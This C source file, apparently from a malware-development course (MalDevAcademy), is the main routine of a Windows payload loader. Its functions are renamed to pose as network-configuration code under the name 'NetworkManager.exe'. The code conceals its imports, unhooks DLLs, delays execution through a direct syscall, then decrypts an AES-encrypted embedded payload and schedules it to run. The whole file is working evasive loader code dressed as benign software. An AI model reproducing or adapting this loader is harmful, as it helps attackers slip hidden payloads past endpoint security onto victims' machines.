// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <shlobj.h>

#include "Structs.h"
#include "Common.h"
#include "Resource.h"
#include "FunctionPntrs.h"
#include "IatCamo.h"
#include "Debug.h"

#pragma comment (lib, "shell32.lib")

/*
NOTE:
    * To enable debug mode, uncomment line 5 in the 'Debug.h' file.
    * To delay execution before dll unhooking, uncomment line 9 in the 'Common.h' file
*/

//------------------------------------------------------------------------------------------------------------
NETWORK_CONFIG      g_NetworkConfig     = { 0 };            // Network protocol configuration (was g_Nt)
FLOAT               g_SessionTimeout    = 0.2;              // Session timeout in minutes
FLOAT               _fltused            = 0.0;              // Required by compiler (CRT replacement)
//------------------------------------------------------------------------------------------------------------

VOID XmInitializeNetworkSubsystem() {
    WCHAR userNetworkPath[MAX_PATH] = { 0 };
    SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, 0, userNetworkPath);
}

VOID XmSimulateNetworkDelay(IN FLOAT delayMinutes) {
    NTSTATUS        operationStatus  = 0x00;
    DWORD           timeoutMs        = (DWORD)(delayMinutes * 60000);
    LONGLONG        latencyValue     = timeoutMs * 10000;
    LARGE_INTEGER   timeoutInterval  = { .QuadPart = (-1 * latencyValue) };

    SET_SYSCALL(g_NetworkConfig.KeepAlive);
    if (!NT_SUCCESS(operationStatus = XmInvokeSystemCall(FALSE, &timeoutInterval)) && operationStatus != ERROR_ENDPOINT_NOT_FOUND) {
#ifdef DEBUG
        PRINT("[!] Network Latency Simulation Failed: 0x%0.8X - %s.%d \n", operationStatus, GET_FILENAME(__FILE__), __LINE__);
#endif
    }
}

int main() {
    PBYTE   resourceBuffer     = NULL,
            processedBuffer    = NULL;
    DWORD   resourceSize       = 0x00;

#ifdef DEBUG
    CreateDebugConsole();
#endif // DEBUG

    // Initialize network components
    XmConcealImports();
    XmInitializeNetworkSubsystem();

    // Setup network protocols
    if (!XmInitializeNetworkProtocols(&g_NetworkConfig)) {
#ifdef DEBUG
        goto _CLEANUP_RESOURCES;
#endif 
        return -1;
    }
    
    // Load network configuration
    if (!XmFetchResourceData(GetModuleHandleH(NULL), CTAES_PAYLOAD_ID, &resourceBuffer, &resourceSize)) {
#ifdef DEBUG
        PRINT("[!] Failed To Load Network Configuration - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
        goto _CLEANUP_RESOURCES;
#endif 
        return -1;
    }

#ifdef DELAY
#ifdef DEBUG
    PRINT("[i] Simulating Network Latency: %d Seconds ... ", (DWORD)(g_SessionTimeout * 60));
#endif 
    XmSimulateNetworkDelay(g_SessionTimeout);
#ifdef DEBUG
    PRINT("[+] DONE \n");
#endif 
#endif // DELAY

    // Protocol security optimization
    XmRestoreOriginalSections();

    // Process network configuration
    if (!XmAllocateEncryptedSection(resourceBuffer, resourceSize, &processedBuffer)) {
#ifdef DEBUG
        PRINT("[!] Network Configuration Processing Failed - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
        goto _CLEANUP_RESOURCES;
#endif 
        return -1;
    }

#ifdef DEBUG
    PRINT("\n\t\t[*]========> Applying Network Configuration In %d Seconds <========[*]\n", NETWORK_TIMEOUT);
#endif 

    // Apply network configuration
    XmScheduleAsyncOperation(processedBuffer);

    return 0;

#ifdef DEBUG
_CLEANUP_RESOURCES:
    switch (MessageBoxA(NULL, "Release Network Resources?", "NetworkManager.exe", MB_OKCANCEL | MB_ICONQUESTION)) {
        case IDOK: {
            FreeConsole();
            break;
        }
        case IDCANCEL: {
            Sleep(-1);
            break;
        }
        default: {
            break;
        }
    }
    return -1;
#endif 
}
